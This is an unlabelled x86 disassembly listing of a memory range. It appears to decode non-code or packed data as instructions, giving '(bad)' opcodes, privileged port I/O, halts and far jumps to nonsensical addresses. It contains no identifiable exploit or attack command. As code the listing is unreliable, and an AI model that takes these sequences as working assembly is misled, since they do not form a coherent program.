  4a4d7a:	hlt    
  4a4d7b:	imul   edi,DWORD PTR [ebx],0xb4b65e4f
  4a4d81:	pusha  
  4a4d82:	cs mov bh,0x3e
  4a4d85:	add    BYTE PTR [edi],cl
  4a4d87:	mov    edi,0x92864942
  4a4d8c:	stc    
  4a4d8d:	ins    BYTE PTR es:[edi],dx
  4a4d8e:	neg    DWORD PTR [ebp-0x27]
  4a4d91:	in     al,dx
  4a4d92:	adc    BYTE PTR [ecx-0x71e30909],bl
  4a4d98:	test   BYTE PTR [edi-0x3527942],bh
  4a4d9e:	ds push cs
  4a4da0:	es sahf 
  4a4da2:	xchg   ecx,eax
  4a4da3:	adc    BYTE PTR [esp+ecx*1],0x85
  4a4da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4da8:	imul   ebx,DWORD PTR [ebx+0x6c],0xc78bb759
  4a4daf:	xor    edi,eax
  4a4db1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a4db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4db4:	mov    cl,0x2a
  4a4db6:	pop    ebx
  4a4db7:	push   ebp
  4a4db8:	xchg   edx,eax
  4a4db9:	inc    esi
  4a4dba:	nop
  4a4dbb:	adc    al,dh
  4a4dbd:	loop   0x4a4dc0
  4a4dbf:	mov    al,ds:0xa8504a95
  4a4dc4:	je     0x4a4e3a
  4a4dc6:	sbb    dh,dh
  4a4dc8:	or     al,0xc2
  4a4dca:	and    BYTE PTR [eax],al
  4a4dcc:	mov    al,ds:0x6fc2ebd8
  4a4dd1:	ret    
  4a4dd2:	clc    
  4a4dd3:	sar    ebx,1
  4a4dd5:	add    esi,DWORD PTR [ebx+ebp*8]
  4a4dd8:	xor    al,0x0
  4a4dda:	jg     0x4a4d70
  4a4ddc:	fs push 0xffffff91
  4a4ddf:	fdivr  DWORD PTR [esi+0x28]
  4a4de2:	or     DWORD PTR [ebx],edx
  4a4de4:	dec    edx
  4a4de5:	jae    0x4a4d9b
  4a4de7:	cmp    al,0x96
  4a4de9:	scas   eax,DWORD PTR es:[edi]
  4a4dea:	mov    ah,0x94
  4a4dec:	hlt    
  4a4ded:	call   0x105aad1d
  4a4df2:	sub    ebx,eax
  4a4df4:	sub    edx,DWORD PTR [edx-0x6e]
  4a4df7:	cmp    ebx,ebp
  4a4df9:	pop    ebp
  4a4dfa:	hlt    
  4a4dfb:	popa   
  4a4dfc:	add    ebx,ebx
  4a4dfe:	xchg   esp,eax
  4a4dff:	fs add dh,cl
  4a4e02:	popa   
  4a4e03:	push   esi
  4a4e04:	add    al,0x9d
  4a4e06:	out    0x26,al
  4a4e08:	stos   BYTE PTR es:[edi],al
  4a4e09:	push   eax
  4a4e0a:	dec    edi
  4a4e0b:	into   
  4a4e0c:	enter  0x7914,0x13
  4a4e10:	or     al,0xaa
  4a4e12:	sub    eax,0x7186c199
  4a4e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4e18:	inc    edx
  4a4e19:	cmp    BYTE PTR ds:0xe9e182fc,cl
  4a4e1f:	sub    al,0xd1
  4a4e21:	cli    
  4a4e22:	addr16 mov dh,0x2d
  4a4e25:	call   0xf8c3:0x3b482a38
  4a4e2c:	fwait
  4a4e2d:	out    dx,eax
  4a4e2e:	jne    0x4a4dc7
  4a4e30:	adc    al,0xfc
  4a4e32:	dec    ebx
  4a4e33:	adc    al,0x27
  4a4e35:	mov    BYTE PTR [ebp-0x10],0x56
  4a4e39:	jle    0x4a4e44
  4a4e3b:	fsub   DWORD PTR [edi]
  4a4e3d:	or     BYTE PTR [edx+eiz*8],dh
  4a4e40:	add    cl,BYTE PTR [edx]
  4a4e42:	add    eax,DWORD PTR [ecx+0x34]
  4a4e45:	xchg   ecx,eax
  4a4e46:	push   0x87ff9e6a
  4a4e4b:	and    DWORD PTR [ecx],0x7404f0fc
  4a4e51:	das    
  4a4e52:	push   edi
  4a4e53:	jo     0x4a4e0d
  4a4e55:	cs cli 
  4a4e57:	add    dl,BYTE PTR [edi+0x2b]
  4a4e5a:	retf   
  4a4e5b:	sub    ebx,eax
  4a4e5d:	add    ecx,edx
  4a4e5f:	add    ebx,DWORD PTR [edx+esi*1]
  4a4e62:	(bad)  
  4a4e64:	push   ds
  4a4e65:	loop   0x4a4e52
  4a4e67:	adc    bl,BYTE PTR [eax]
  4a4e69:	hlt    
  4a4e6a:	pop    ecx
  4a4e6b:	sub    eax,0x909786a4
  4a4e70:	push   ds
  4a4e71:	dec    edx
  4a4e72:	jb     0x4a4e3e
  4a4e74:	pop    ecx
  4a4e75:	js     0x4a4dfa
  4a4e77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a4e78:	jno    0x4a4e1f
  4a4e7a:	test   dl,0x7c
  4a4e7d:	inc    edi
  4a4e7e:	sbb    ebp,DWORD PTR [esi+0x64]
  4a4e81:	out    dx,al
  4a4e82:	test   BYTE PTR [esi+0x37140f82],cl
  4a4e88:	lods   al,BYTE PTR ds:[esi]
  4a4e89:	clc    
  4a4e8a:	sub    ecx,DWORD PTR [ebx+eax*1-0x6139fc07]
  4a4e91:	jmp    0x4a4ead
  4a4e93:	pusha  
  4a4e94:	shr    DWORD PTR [esi+0x6b],0x18
  4a4e98:	clc    
  4a4e99:	push   ebx
  4a4e9a:	sub    eax,0xeb2e03c7
  4a4e9f:	push   es
  4a4ea0:	es push ds
  4a4ea2:	add    cl,0x24
  4a4ea5:	dec    ecx
  4a4ea6:	mov    dh,0x56
  4a4ea8:	xchg   ebp,eax
  4a4ea9:	and    BYTE PTR [esi+0x5a],al
  4a4eac:	xchg   BYTE PTR [esi],al
  4a4eae:	jle    0x4a4edb
  4a4eb0:	das    
  4a4eb1:	inc    ecx
  4a4eb2:	(bad)  
  4a4eb3:	jmp    0x4a4e3f
  4a4eb5:	jge    0x4a4e8b
  4a4eb7:	fwait
  4a4eb8:	adc    eax,0x954c982c
  4a4ebd:	ds push 0xad5a942
  4a4ec3:	adc    DWORD PTR [ecx+0x71aeec55],ebx
  4a4ec9:	in     al,0xe3
  4a4ecb:	sahf   
  4a4ecc:	inc    eax
  4a4ecd:	push   eax
  4a4ece:	cmp    ecx,DWORD PTR [esi+0xd17beda]
  4a4ed4:	push   0x1c592414
  4a4ed9:	es jle 0x4a4f16
  4a4edc:	and    cl,BYTE PTR [eax-0x6ec5b83a]
  4a4ee2:	jl     0x4a4f09
  4a4ee4:	pop    esp
  4a4ee5:	jne    0x4a4f23
  4a4ee7:	sub    ch,al
  4a4ee9:	test   BYTE PTR [esi-0x438adfd8],0x52
  4a4ef0:	pop    DWORD PTR [esp+esi*2-0x80]
  4a4ef4:	xor    bl,bl
  4a4ef6:	imul   edi,DWORD PTR [eax+0x5b4bdf3f],0x3c8bed54
  4a4f00:	push   DWORD PTR [esi+ebx*4-0x3e]
  4a4f04:	test   BYTE PTR [ebx+0x3b164dc5],ch
  4a4f0a:	xchg   DWORD PTR [edi+ebp*8+0x4a4a4e93],edx
  4a4f11:	xchg   DWORD PTR [ebx-0x7d],ebx
  4a4f14:	jmp    0x4a4e9c
  4a4f16:	mov    esp,0x9a5fa527
  4a4f1b:	adc    al,0x10
  4a4f1d:	push   ebx
  4a4f1e:	push   0x5
  4a4f20:	push   esi
  4a4f21:	inc    ecx
  4a4f22:	mov    ecx,0xca563483
  4a4f27:	add    ch,bh
  4a4f29:	mov    edx,0xc4d853
  4a4f2e:	aad    0xa
  4a4f30:	rol    dl,0xc3
  4a4f33:	add    BYTE PTR [esi+0x62],ah
  4a4f36:	add    eax,0xdb8c9107
  4a4f3b:	adc    al,0x16
  4a4f3d:	adc    cl,BYTE PTR [ecx-0x55fcdcf0]
  4a4f43:	mov    bh,0xb0
  4a4f45:	fimul  DWORD PTR [ebx+0x55]
  4a4f48:	jno    0x4a4fa1
  4a4f4a:	sub    BYTE PTR [ecx+0x1900f578],cl
  4a4f50:	neg    DWORD PTR [esp+eax*1]
  4a4f53:	mov    ah,0x17
  4a4f55:	push   ds
  4a4f56:	ds add eax,0xfff9d5b8
  4a4f5c:	in     eax,0x3d
  4a4f5e:	loope  0x4a4f9d
  4a4f60:	mov    dl,0x83
  4a4f62:	jmp    DWORD PTR [eax]
  4a4f64:	mov    edi,0x96bb12d1
  4a4f69:	stos   BYTE PTR es:[edi],al
  4a4f6a:	xchg   esi,eax
  4a4f6b:	cs in  al,0x10
  4a4f6e:	test   al,0x57
  4a4f70:	mov    eax,DWORD PTR [esi+0x2c319f01]
  4a4f76:	or     al,0xed
  4a4f78:	or     ebx,edi
  4a4f7a:	mov    esp,DWORD PTR [ebp+ebp*4-0xb0ed6f8]
  4a4f81:	adc    BYTE PTR [ecx],ch
  4a4f83:	add    DWORD PTR [ebp-0x283f4682],ecx
  4a4f89:	or     BYTE PTR [ebx+0x4c],0x66
  4a4f8d:	mov    dl,0x66
  4a4f8f:	fs push 0x92d77c10
  4a4f95:	add    al,0x4c
  4a4f97:	pop    ebp
  4a4f98:	or     al,0x96
  4a4f9a:	sbb    BYTE PTR [esi+0x77],0xba
  4a4f9e:	mov    esp,0xb39e84be
  4a4fa3:	mov    DWORD PTR [esi+0x48],0x22c2c9ab
  4a4faa:	sbb    eax,ebx
  4a4fac:	jp     0x4a501d
  4a4fae:	push   ebx
  4a4faf:	cmp    dl,dl
  4a4fb1:	fld    DWORD PTR [esi+0x78]
  4a4fb4:	mov    DWORD PTR [eax+0x21],esi
  4a4fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a4fb8:	and    ebx,DWORD PTR [ebx]
  4a4fba:	or     cl,BYTE PTR [edx-0x5a2df67e]
  4a4fc0:	mov    DWORD PTR [edx+0x57a26cf],esi
  4a4fc6:	scas   al,BYTE PTR es:[edi]
  4a4fc7:	outs   dx,BYTE PTR ds:[esi]
  4a4fc8:	sbb    BYTE PTR [ecx],0x5c
  4a4fcb:	add    edi,DWORD PTR [edx+0x9]
  4a4fce:	out    0xd8,al
  4a4fd0:	div    BYTE PTR [esi-0x39]
  4a4fd3:	retf   
  4a4fd4:	mov    al,0x1
  4a4fd6:	cmp    DWORD PTR [ecx],edi
  4a4fd8:	xchg   esi,eax
  4a4fd9:	nop
  4a4fda:	mov    ecx,DWORD PTR [ecx]
  4a4fdc:	or     al,0x75
  4a4fde:	cli    
  4a4fdf:	mov    DWORD PTR [ecx],eax
  4a4fe1:	cmp    eax,0xa44f804e
  4a4fe6:	dec    ebp
  4a4fe7:	and    esi,DWORD PTR [eax+0x78]
  4a4fea:	sbb    eax,DWORD PTR [esi+eax*1-0x6e]
  4a4fee:	cmp    eax,0x476846a
  4a4ff3:	in     al,dx
  4a4ff4:	sub    BYTE PTR [eax+0x4e840e74],al
  4a4ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4ffb:	dec    ebp
  4a4ffc:	sbb    BYTE PTR [ebx+0x11088f83],al
  4a5002:	jl     0x4a501e
  4a5004:	pop    edi
  4a5005:	sbb    ebx,eax
  4a5007:	add    al,0xe2
  4a5009:	or     BYTE PTR [edi],0x38
  4a500c:	out    0xae,al
  4a500e:	and    ah,0x5
  4a5011:	fstp   TBYTE PTR [esi+0x3a379c88]
  4a5017:	mov    al,ds:0x1ef8b588
  4a501c:	and    eax,0x511a2c04
  4a5021:	les    edx,FWORD PTR [esi+0x25dd0c74]
  4a5027:	lods   al,BYTE PTR ds:[esi]
  4a5028:	adc    DWORD PTR [edx-0x68],eax
  4a502b:	mov    cs,WORD PTR [eax+0x14]
  4a502e:	adc    al,0xe4
  4a5030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a5031:	and    BYTE PTR [eax*2-0x9b6afec],dl
  4a5038:	dec    ebp
  4a5039:	call   ecx
  4a503b:	mov    DWORD PTR [esi+edi*8+0x16],ecx
  4a503f:	push   esp
  4a5040:	(bad)  
  4a5041:	adc    al,0x47
  4a5043:	mov    DWORD PTR [eax+edi*2-0x3295cf94],eax
  4a504a:	pop    ds
  4a504b:	mov    ecx,DWORD PTR [ebx-0x57f8f7b9]
  4a5051:	inc    eax
  4a5052:	rcl    BYTE PTR [ebp+0x1c],0x83
  4a5056:	mov    al,0x93
  4a5058:	ss pusha 
  4a505a:	or     eax,0x933a1d2
  4a505f:	push   ebp
  4a5060:	cmp    DWORD PTR [eax+0x1],edx
  4a5063:	pop    ecx
  4a5064:	xchg   edx,eax
  4a5065:	mov    eax,0x838b7fcc
  4a506a:	rol    BYTE PTR [edi],1
  4a506c:	mov    edx,0x6b4eba2c
  4a5071:	icebp  
  4a5072:	lea    ebp,[esi]
  4a5074:	fadd   st,st(5)
  4a5076:	cmp    DWORD PTR [eax+0x76],ecx
  4a5079:	popa   
  4a507a:	cmp    BYTE PTR [eax+0x58740bd5],0x8a
  4a5081:	mov    BYTE PTR [esi+edi*4-0x15061e24],dl
  4a5088:	sar    DWORD PTR [ebx],1
  4a508a:	xchg   ebx,eax
  4a508b:	pop    ss
  4a508c:	cmp    BYTE PTR [ebx+0x57d25bac],0xf9
  4a5093:	ds sub dl,0x39
  4a5097:	dec    edi
  4a5098:	dec    edi
  4a5099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a509a:	or     DWORD PTR [esp+edi*4-0x171bf1e8],0x4e2b4907
  4a50a5:	je     0x4a50a7
  4a50a7:	add    dh,dh
  4a50a9:	xor    BYTE PTR [ecx-0xe],0xac
  4a50ad:	retf   0x2a9
  4a50b0:	adc    al,0x49
  4a50b2:	sbb    dh,BYTE PTR [ebp+0xb]
  4a50b5:	and    BYTE PTR [eax-0x50eb0fc2],dh
  4a50bb:	add    eax,0x116e817e
  4a50c0:	or     al,0x96
  4a50c2:	fcomp  QWORD PTR [eax+0x31]
  4a50c5:	jmp    0x40827c5a
  4a50ca:	mov    ah,0x3b
  4a50cc:	outs   dx,BYTE PTR ds:[esi]
  4a50cd:	loopne 0x4a5093
  4a50cf:	sbb    ah,ah
  4a50d1:	fs pop ebx
  4a50d3:	ds push ebx
  4a50d5:	and    BYTE PTR [edi+0x2c374aa7],0xe3
  4a50dc:	mov    WORD PTR [ebx+0x1b],es
  4a50df:	fwait
  4a50e0:	sbb    al,BYTE PTR [ebp-0x54]
  4a50e3:	rol    BYTE PTR [ebx+ebx*2],0x30
  4a50e7:	push   esi
  4a50e8:	and    DWORD PTR [ebp-0x59],0x35594146
  4a50ef:	or     BYTE PTR [esi],bl
  4a50f1:	rol    BYTE PTR [ecx-0x78],cl
  4a50f4:	jp     0x4a50f5
  4a50f6:	cmc    
  4a50f7:	aad    0xbd
  4a50f9:	adc    BYTE PTR [ebx+eax*4+0x6892c68c],0xc
  4a5101:	adc    esi,DWORD PTR [ecx+0x15]
  4a5104:	xor    al,BYTE PTR [esi-0x1b]
  4a5107:	rcl    DWORD PTR [ebx+edx*1],1
  4a510a:	jb     0x4a50f3
  4a510c:	xchg   esi,eax
  4a510d:	mov    ebp,0xe351868b
  4a5112:	sub    eax,DWORD PTR [ecx]
  4a5114:	jge    0x4a50d0
  4a5116:	xor    bh,bh
  4a5118:	cmp    BYTE PTR [esi+0x38],0x7b
  4a511c:	mov    dh,0x39
  4a511e:	dec    ecx
  4a511f:	inc    ebx
  4a5120:	je     0x4a50b0
  4a5122:	xchg   BYTE PTR [edi+eax*8-0x5ee822f5],dl
  4a5129:	sar    DWORD PTR [edi],1
  4a512b:	push   eax
  4a512c:	pop    DWORD PTR [ebx]
  4a512e:	cli    
  4a512f:	or     DWORD PTR [edi-0x3a],ecx
  4a5132:	jmp    0x86d0941c
  4a5137:	mov    edi,0x9650719c
  4a513c:	xchg   esp,eax
  4a513d:	xor    BYTE PTR [esi],dl
  4a513f:	xchg   ebp,eax
  4a5140:	push   ebp
  4a5141:	outs   dx,BYTE PTR ds:[esi]
  4a5142:	sub    BYTE PTR [ebx-0xf],0xaf
  4a5146:	inc    DWORD PTR [esi+0xb8ebd90]
  4a514c:	js     0x4a50d9
  4a514e:	push   ebp
  4a514f:	adc    al,dl
  4a5151:	cmc    
  4a5152:	xchg   BYTE PTR [eax+esi*8+0x70],ah
  4a5156:	sub    BYTE PTR ds:[ecx],0xa0
  4a515a:	popa   
  4a515b:	cmp    ecx,DWORD PTR [eax-0x1dd390f7]
  4a5161:	sub    eax,0xe96a592f
  4a5166:	xchg   esp,eax
  4a5167:	es mov ch,0x66
  4a516a:	rol    DWORD PTR [ecx],0x92
  4a516d:	jp     0x4a50f9
  4a516f:	fdivr  DWORD PTR [eax-0x4c]
  4a5172:	mov    DWORD PTR [eax+0x1289db7],ebx
  4a5178:	push   0x20cfd027
  4a517d:	popf   
  4a517e:	mov    esp,0x75e98093
  4a5183:	sahf   
  4a5184:	cmp    eax,0x841605fd
  4a5189:	adc    eax,0x4c164c60
  4a518e:	mov    ch,0xba
  4a5190:	mov    ebp,0x360a80d0
  4a5195:	loopne 0x4a5181
  4a5197:	mov    WORD PTR [ebx],?
  4a5199:	sbb    al,0x51
  4a519b:	sub    DWORD PTR [eax],0x5388cb8c
  4a51a1:	cmc    
  4a51a2:	add    al,0xf0
  4a51a4:	jge    0x4a521a
  4a51a6:	cmp    al,0x4f
  4a51a8:	xchg   dh,ch
  4a51aa:	mov    ch,0xeb
  4a51ac:	push   ebx
  4a51ad:	ss jg  0x4a5203
  4a51b0:	ret    0x8887
  4a51b3:	xlat   BYTE PTR ds:[ebx]
  4a51b4:	rcl    BYTE PTR [ebx-0x56],cl
  4a51b7:	addr16 call 0x2589171a
  4a51bd:	repnz push ss
  4a51bf:	loopne 0x4a51e3
  4a51c1:	and    BYTE PTR [eax+0x12523b7c],bh
  4a51c7:	dec    BYTE PTR [ecx]
  4a51c9:	loop   0x4a5175
  4a51cb:	adc    al,0x13
  4a51cd:	cmc    
  4a51ce:	sub    BYTE PTR [ebx-0x11af16da],ch
  4a51d4:	cmp    BYTE PTR [edx-0x46],dl
  4a51d7:	mov    ecx,0xddc0ca13
  4a51dc:	in     al,0x89
  4a51de:	dec    esi
  4a51df:	xor    eax,0xaf7d10f8
  4a51e4:	sub    ebx,DWORD PTR [ebx+0x18]
  4a51e7:	push   es
  4a51e8:	pop    ds
  4a51e9:	retf   
  4a51ea:	push   ebp
  4a51eb:	and    BYTE PTR [esi-0x22],bl
  4a51ee:	cli    
  4a51ef:	adc    bh,BYTE PTR [edx+0x466e2c7d]
  4a51f5:	or     DWORD PTR [eax+ebx*8],esp
  4a51f8:	push   cs
  4a51f9:	(bad)  
  4a51fa:	xchg   ecx,eax
  4a51fb:	rcl    DWORD PTR [edx+eiz*8+0x12],1
  4a51ff:	fmul   DWORD PTR [ebx-0x5becbd58]
  4a5205:	mov    BYTE PTR [ebp+0x129ca3ef],0xeb
  4a520c:	xor    eax,0xfd289a7
  4a5211:	dec    esi
  4a5212:	sub    DWORD PTR [edx+0x48],edi
  4a5215:	pop    eax
  4a5216:	mov    ecx,esi
  4a5218:	mov    edx,edx
  4a521a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a521b:	mov    dh,0xf6
  4a521d:	jo     0x4a527f
  4a521f:	lds    esp,FWORD PTR [eax+eax*8+0x3d]
  4a5223:	sub    eax,0xa1f00796
  4a5228:	ins    DWORD PTR es:[edi],dx
  4a5229:	dec    edi
  4a522a:	cmp    al,0x97
  4a522c:	sbb    ch,bl
  4a522e:	(bad)  
  4a522f:	push   0xaf895a23
  4a5234:	dec    esp
  4a5235:	cwde   
  4a5236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a5237:	cmc    
  4a5238:	add    al,0xb8
  4a523a:	or     BYTE PTR [edi+0x512a3588],dh
  4a5240:	scas   al,BYTE PTR es:[edi]
  4a5241:	jo     0x4a51ce
  4a5243:	push   0xbe05f766
  4a5248:	jecxz  0x4a5259
  4a524a:	xchg   esi,eax
  4a524b:	push   esp
  4a524c:	ds das 
  4a524e:	push   ebx
  4a524f:	mov    bl,0x1a
  4a5251:	pop    ss
  4a5252:	fisub  DWORD PTR es:[esi+ecx*4]
  4a5256:	jl     0x4a5292
  4a5258:	cmc    
  4a5259:	or     eax,0x4439d1bf
  4a525e:	loopne 0x4a5211
  4a5260:	cmc    
  4a5261:	cmp    BYTE PTR [eax+0x7e96544b],bl
  4a5267:	mov    bh,0x75
  4a5269:	sbb    eax,0x52f09522
  4a526e:	aad    0xba
  4a5270:	mov    esp,edx
  4a5272:	add    ch,BYTE PTR ss:[edi+eax*1]
  4a5276:	dec    esi
  4a5277:	dec    esi
  4a5278:	jge    0x4a5245
  4a527a:	inc    esi
  4a527b:	fcomp  DWORD PTR gs:[edi]
  4a527e:	sub    BYTE PTR [esi+0x3d],ch
  4a5281:	clc    
  4a5282:	jg     0x4a52bd
  4a5284:	nop
  4a5285:	jg     0x4a5240
  4a5287:	in     eax,dx
  4a5288:	push   0x77
  4a528a:	dec    eax
  4a528b:	sub    ah,BYTE PTR [eax]
  4a528d:	and    bh,BYTE PTR [edi+0x9]
  4a5290:	jno    0x4a5272
  4a5292:	test   DWORD PTR [esi],eax
  4a5294:	hlt    
  4a5295:	jle    0x4a525f
  4a5297:	dec    edi
  4a5298:	fdiv   st,st(7)
  4a529a:	jg     0x4a52be
  4a529c:	nop
  4a529d:	sbb    BYTE PTR [esp+ecx*2+0x44579e0],cl
  4a52a4:	xchg   ebp,eax
  4a52a5:	lea    eax,[ebp+0x1f]
  4a52a8:	outs   dx,DWORD PTR ds:[esi]
  4a52a9:	icebp  
  4a52aa:	add    cl,dh
  4a52ac:	dec    ebx
  4a52ad:	and    edi,DWORD PTR [esi]
  4a52af:	xor    BYTE PTR [ecx+0x5b68df7e],0x75
  4a52b6:	es je  0x4d7ac534
  4a52bd:	(bad)  
  4a52be:	mov    al,BYTE PTR [ecx]
  4a52c0:	push   edi
  4a52c1:	in     eax,dx
  4a52c2:	sbb    eax,0xf17f48d3
  4a52c7:	fwait
  4a52c8:	hlt    
  4a52c9:	mov    al,0xdc
  4a52cb:	ins    BYTE PTR es:[edi],dx
  4a52cc:	je     0x4a52ee
  4a52ce:	or     eax,0xb0d1a410
  4a52d3:	and    eax,0xf0bbed89
  4a52d8:	ret    0x24d8
  4a52db:	imul   ebx,DWORD PTR [ecx+0x61],0x3a
  4a52df:	mov    cl,BYTE PTR [eax+0x6]
  4a52e2:	push   esi
  4a52e3:	jl     0x4a52f2
  4a52e5:	and    BYTE PTR [ecx+0x43],dh
  4a52e8:	ins    BYTE PTR es:[edi],dx
  4a52e9:	mov    eax,DWORD PTR [esi+ecx*2]
  4a52ec:	pusha  
  4a52ed:	inc    esp
  4a52ee:	mov    bl,0x40
  4a52f0:	pop    esp
  4a52f1:	cmp    ebx,edx
  4a52f3:	push   0x938e01ef
  4a52f8:	inc    edi
  4a52f9:	push   ecx
  4a52fa:	sti    
  4a52fb:	add    esp,DWORD PTR [edx+0x1c]
  4a52fe:	push   es
  4a52ff:	dec    ebx
  4a5300:	jg     0x4a5314
  4a5302:	loop   0x4a5347
  4a5304:	inc    eax
  4a5305:	push   edi
  4a5306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a5307:	hlt    
  4a5308:	xor    eax,0x252794a2
  4a530d:	push   cs
  4a530e:	pop    edx
  4a530f:	push   eax
  4a5310:	sar    DWORD PTR ds:[eax+0x518da7a6],cl
  4a5317:	adc    esi,edi
  4a5319:	shl    BYTE PTR [edx],1
  4a531b:	dec    edi
  4a531c:	lock xor al,BYTE PTR [edx]
  4a531f:	shr    edx,1
  4a5321:	sub    eax,0x9602d93c
  4a5326:	jmp    0x4a52a8
  4a5328:	cmp    BYTE PTR [edi+0x68197009],ah
  4a532e:	mov    eax,ds:0x2ecea8cb
  4a5333:	jno    0x4a534a
  4a5335:	and    BYTE PTR [eax+ecx*8],dl
  4a5338:	(bad)  
  4a5339:	(bad)  
  4a533a:	push   edx
  4a533b:	and    esi,0x53
  4a533e:	std    
  4a533f:	scas   eax,DWORD PTR es:[edi]
  4a5340:	adc    al,0x32
  4a5342:	mov    eax,0x49f49f49
  4a5347:	imul   edi
  4a5349:	sub    edx,edi
  4a534b:	shr    DWORD PTR [esi+0x7e],0x21
  4a534f:	add    DWORD PTR ds:0x9a06cad8,ecx
  4a5355:	ror    DWORD PTR cs:[edx+0x5b],1
  4a5359:	mov    cs,edx
  4a535b:	push   ecx
  4a535c:	scas   al,BYTE PTR es:[edi]
  4a535d:	inc    esp
  4a535e:	push   ebp
  4a535f:	sbb    al,0xe9
  4a5361:	jbe    0x4a5392
  4a5363:	inc    edx
  4a5364:	dec    ebp
  4a5365:	xor    cl,dh
  4a5367:	xor    BYTE PTR [esi-0x74839f45],dl
  4a536d:	mov    ebx,0x31750101
  4a5372:	cmp    BYTE PTR [ebp+0x20],0x2b
  4a5376:	bswap  esi
  4a5378:	retf   
  4a5379:	ss ret 0x83bf
  4a537d:	dec    esi
  4a537e:	or     al,0x8b
  4a5380:	test   BYTE PTR [ebx+0x3b530c82],dl
  4a5386:	out    dx,eax
  4a5387:	out    0x2e,al
  4a5389:	sbb    al,0xb
  4a538c:	sahf   
  4a538d:	ret    0x3cbb
  4a5390:	retf   
  4a5391:	fbstp  TBYTE PTR [ebx+0x0]
  4a5394:	jne    0x4a53ab
  4a5396:	movzx  ebp,BYTE PTR [edx-0x3f]
  4a539a:	cdq    
  4a539b:	dec    eax
  4a539c:	in     al,dx
  4a539d:	stc    
  4a539e:	jns    0x4a53a1
  4a53a0:	push   ebx
  4a53a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a53a2:	xchg   BYTE PTR [ebx],al
  4a53a4:	jl     0x4a5409
  4a53a6:	jae    0x4a53e8
  4a53a8:	inc    BYTE PTR [ebx-0x1be5a6d8]
  4a53ae:	sub    BYTE PTR [ebp-0x4526df78],ah
  4a53b4:	inc    esi
  4a53b5:	or     al,0x3
  4a53b7:	dec    ebx
  4a53b8:	mov    ?,WORD PTR [ecx]
  4a53ba:	jp     0x4a53be
  4a53bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a53bd:	loopne 0x4a5425
  4a53bf:	push   edx
  4a53c0:	sub    BYTE PTR [esi-0x68],cl
  4a53c3:	dec    ebp
  4a53c4:	or     dl,ch
  4a53c6:	jle    0x4a5422
  4a53c8:	mov    BYTE PTR [ecx+0x24d21201],cl
  4a53ce:	inc    ebx
  4a53cf:	je     0x4a5387
  4a53d1:	add    al,bl
  4a53d3:	or     al,0xc2
  4a53d5:	add    BYTE PTR [ecx],bh
  4a53d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a53d8:	adc    DWORD PTR [ecx],ebp
  4a53da:	or     DWORD PTR [ecx],0x29
  4a53dd:	mov    ah,0xeb
  4a53df:	inc    ebp
  4a53e0:	(bad)  
  4a53e1:	dec    esp
  4a53e2:	iret   
  4a53e3:	inc    esp
  4a53e4:	stos   DWORD PTR es:[edi],eax
  4a53e5:	sbb    BYTE PTR [ebx+0x62],bl
  4a53e8:	add    DWORD PTR [ecx-0x2b],edx
  4a53eb:	xor    bl,BYTE PTR [edx]
  4a53ed:	(bad)  
  4a53ee:	xor    ebx,ebp
  4a53f0:	or     dh,BYTE PTR [eax+eax*8+0x6225760f]
  4a53f7:	rol    BYTE PTR [eax],0x3d
  4a53fa:	dec    ebx
  4a53fb:	mov    ebp,0xb709c141
  4a5400:	adc    BYTE PTR [edx],ah
  4a5402:	cmp    al,0x5e
  4a5404:	addr16 sti 
  4a5406:	push   edi
  4a5407:	inc    ecx
  4a5408:	add    esi,DWORD PTR [esi]
  4a540a:	clc    
  4a540b:	sub    eax,0xe2f898c6
  4a5410:	je     0x4a5429
  4a5412:	push   eax
  4a5413:	sub    esi,DWORD PTR es:[eax+0x40]
  4a5417:	adc    bl,0x5e
  4a541a:	rcr    ah,0xb6
  4a541d:	mov    ecx,0x8005368f
  4a5422:	jnp    0x4a53d8
  4a5424:	inc    ebx
  4a5425:	and    edi,0xff812487
  4a542b:	xchg   edi,eax
  4a542c:	adc    ebx,DWORD PTR [ebx]
  4a542e:	dec    ebx
  4a542f:	inc    esp
  4a5430:	fstp   QWORD PTR [edx]
  4a5432:	push   0xffffffb3
  4a5434:	jg     0x4a5443
  4a5436:	xlat   BYTE PTR ds:[bx]
  4a5438:	jmp    0x4a543b
  4a543a:	inc    ebx
  4a543b:	dec    eax
  4a543c:	jmp    0x4a5447
  4a543e:	adc    eax,0x1db7bb29
  4a5443:	ss push 0x47
  4a5446:	jp     0x4a544b
  4a5448:	stos   BYTE PTR es:[edi],al
  4a5449:	xchg   esp,eax
  4a544a:	sub    ah,BYTE PTR [edx+0x3c8089b]
  4a5450:	iret   
  4a5451:	pop    edi
  4a5452:	add    al,0x34
  4a5454:	mov    dh,0x23
  4a5456:	xchg   ebp,eax
  4a5457:	shl    DWORD PTR [edi],cl
  4a5459:	repnz add cl,bl
  4a545c:	pusha  
  4a545d:	fldcw  WORD PTR [ecx+0x1]
  4a5460:	add    ah,cl
  4a5462:	pop    ecx
  4a5463:	les    ebx,FWORD PTR ds:0x7e80381a
  4a5469:	cmp    ch,ch
  4a546b:	adc    bl,BYTE PTR ss:[edx-0x1e]
  4a546f:	jmp    0xf846:0xc6b990be
  4a5476:	ror    BYTE PTR [ebx],0xbc
  4a5479:	push   ds
  4a547a:	jl     0x4a549e
  4a547c:	cmp    BYTE PTR [esi+0x2e2119bf],0x5c
  4a5483:	pusha  
  4a5484:	adc    eax,0xbc0a33fd
  4a5489:	or     BYTE PTR [eax],dh
  4a548b:	jmp    0x8b7e:0x32870f43
  4a5492:	sbb    eax,0xcb54413
  4a5497:	paddb  mm6,mm5
